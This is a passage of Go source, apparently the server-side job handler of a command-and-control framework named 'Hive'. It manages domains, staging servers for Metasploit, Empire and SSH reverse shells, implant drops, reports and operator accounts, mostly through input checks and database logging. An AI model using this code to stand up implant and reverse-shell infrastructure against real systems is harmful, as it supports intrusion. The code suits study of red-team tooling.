        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				}

				jStatus = setJobStatusDB(jid,"Success")
				jResult = setJobResultDB(jid,"Hive-createDomain(Domain "+commandO.Name+"Created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

				return

			case "deleteDomain":
    			
    			jsconcommanA := make([]DeleteDomain, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteDomain(Command JSON Decoding Error)")
					
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteDomain(Domain "+commandO.Name+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

				existV,_ := existDomainDB(commandO.Name)
				if !existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteDomain(Domain Exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
				}

				errDeleteDomain := rmDomainDB(commandO.Name)
				if errDeleteDomain != nil{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"deleteDomain(VPS "+commandO.Name+" DB Error:"+errDeleteDomain.Error()+")")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				}

				jStatus = setJobStatusDB(jid,"Success")
				jResult = setJobResultDB(jid,"Hive-deleteDomain(Domain "+commandO.Name+" Deleted)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

				return

			case "createStaging":

    			jsconcommanA := make([]Staging, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createStaging(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
   				}

    			//Decode Staging by type and do formatting check
				switch commandO.Stype{

					case "https_droplet_letsencrypt":
						var droplet *Droplet
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &droplet)
						if errDaws != nil {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(Droplet Parameters Decoding Error):"+errDaws.Error())
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}
							
							return
						}

    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName) && tcpPortInputWhite(droplet.HttpsPort) && 
    						namesInputWhite(droplet.Path)){

							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(Droplet Incorrect Param. Formatting)")
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        					return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
    					}

    				case "https_msft_letsencrypt":
						var msf *Msf
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &msf)
						if errDaws != nil {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(MSFT Parameters Decoding Error):"+errDaws.Error())
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
						}

    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName) && tcpPortInputWhite(msf.HttpsPort)){

							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
    					}

    				case "https_empire_letsencrypt":
						var empire *Empire
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &empire)
						if errDaws != nil {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(MSFT Parameters Decoding Error):"+errDaws.Error())
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
						}

    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName) && tcpPortInputWhite(empire.HttpsPort)){

							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
    					}

    				case "ssh_rev_shell":

    				if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName)){

							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Staging Add(Rev. SSH Incorrect params formatting)")
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

						return
    				}

					default:
						jStatus = setJobStatusDB(jid,"Error")
						jResult = setJobResultDB(jid,"Staging Add(Staging Type not yet Implemented)")
						if (jStatus != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        					return
						}
						if (jResult != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        					return
						}

				}	


				existV,_ := existStagingDB(commandO.Name)
				if existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createStaging(Staging exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
				}

				errI := createStaging(commandO.Name,commandO.Stype,commandO.Parameters,commandO.VpsName,commandO.DomainName)

				if errI != ""{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createStaging(Staging "+errI+" Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					removeStaging(commandO.Name)
					return
				}else{
					jStatus = setJobStatusDB(jid,"Success")
					jResult = setJobResultDB(jid,"Hive-createStaging(Staging "+commandO.Name+" created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
				}

			case "deleteStaging":
    			
    			jsconcommanA := make([]DeleteStaging, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteStaging(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
    			}


    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteStaging(Staging "+commandO.Name+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
    			}

				existI,_ := existStagingDB(commandO.Name)
				if !existI{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteStaging(Staging doesn't exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}
				resRemove := removeStaging(commandO.Name)
				if resRemove != "Done"{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteStaging(Staging Infra Not removed):"+resRemove)
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}
				jStatus = setJobStatusDB(jid,"Succes")
				jResult = setJobResultDB(jid,"Hive-deleteStaging(Staging "+commandO.Name+" deleted)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				return

			case "dropImplant":
    			
    			jsconcommanA := make([]DropImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

    			if !namesInputWhite(commandO.Staging){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Staging "+commandO.Staging+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
    			}


				existI,_ := existStagingDB(commandO.Staging)
				if !existI{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Staging doesn't exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}

				stagingO := getStagingDB(commandO.Staging)
				if !strings.Contains(stagingO.Stype,"droplet"){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Staging is not a Droplet)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}

				var droplet *Droplet
				errD = json.Unmarshal([]byte(stagingO.Parameters), &droplet)
				if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Problem Decoding Staging Droplet Object Parameters)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
   	 				return
				}
				
    			//Server Side white-list for Hive Commands
    			if !(namesInputWhite(commandO.Implant) && namesInputWhite(commandO.Staging) && namesInputWhite(stagingO.DomainName) && 
    				namesInputWhite(droplet.Path) && namesInputWhite(commandO.Os) && namesInputWhite(commandO.Arch) && 
    				filesInputWhite(commandO.Filename)){

					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Drop "+commandO.Implant+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

				errI := dropImplant(commandO.Implant,commandO.Staging,stagingO.DomainName,droplet.Path,commandO.Os,commandO.Arch,commandO.Filename)
				if errI != ""{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Drop Implant "+errI+" Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}else{
					jStatus = setJobStatusDB(jid,"Success")
					jResult = setJobResultDB(jid,"Hive-dropImplant(Drop Implant: "+stagingO.DomainName+":"+droplet.HttpsPort+"/"+droplet.Path+"/"+commandO.Filename+" created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}					
					return
				}

			case "createReport":

    			jsconcommanA := make([]Report, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createReport(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
   				}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}   				

				existV,_ := existReportDB(commandO.Name)
				if existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createReport(Report exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}

				errI := createReport(commandO.Name)

				if errI != ""{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createReport(Report "+errI+" Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}else{
					jStatus = setJobStatusDB(jid,"Success")
					jResult = setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}

			case "addOperator":

    			jsconcommanA := make([]AddOperator, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-addOperator(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
   				}

   				//Escape JID
    			if !idsInputWhite(jobO.Cid){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-addOperator(Report "+jobO.Cid+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			} 

   				if isUserAdminDB(jobO.Cid) != "Yes"{
   					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-addOperator(Is not Admin User)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
   				}


   				err,_ := addUser(commandO.Username,commandO.Password)
    			if err != "" {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-addOperator(Error adding new user to DB):"+err)
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
   				}else{
					jStatus = setJobStatusDB(jid,"Success")
					jResult = setJobResultDB(jid,"Hive-addOperator(Operator "+commandO.Username+" added)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}


			//If the Job Name String is not found register an Error
			default:
				jStatus = setJobStatusDB(jid,"Error")
				jResult = setJobResultDB(jid,"Hive-JobNotImplemented")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				return
		}

	//Jobs coming from Redirectors (not from Footholds) for the moment just logs
	}else if strings.Contains(jobO.Pid,"R-") && strings.Contains(jobO.Chid,"None"){

		//Fetch params for Jobs that are not related to Hive
		cid = jobO.Cid
		pid = jobO.Pid
		chid = jobO.Chid
		jid = jobO.Jid
		job = jobO.Job
		parameters = jobO.Parameters

		switch job{

			case "log":
   				jsconcommanA := make([]Log, 0)
   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
   				errD := decoder.Decode(&jsconcommanA)
   				// Error Log
    			if errD != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+pid+":Redirector Log(JSON Decoding Error)"+errD.Error())
					addLogDB("Hive",time,elog)
					return
   				}
   				commandO := jsconcommanA[0]
				addLogDB(pid,commandO.Time,commandO.Error)
				return
			default:
				time := time.Now().Format("02/01/2006 15:04:05 MST")
				elog := fmt.Sprintf("Job by "+cid+":Redirector(Job not implemented)")
				addLogDB(pid,time,elog)
		}

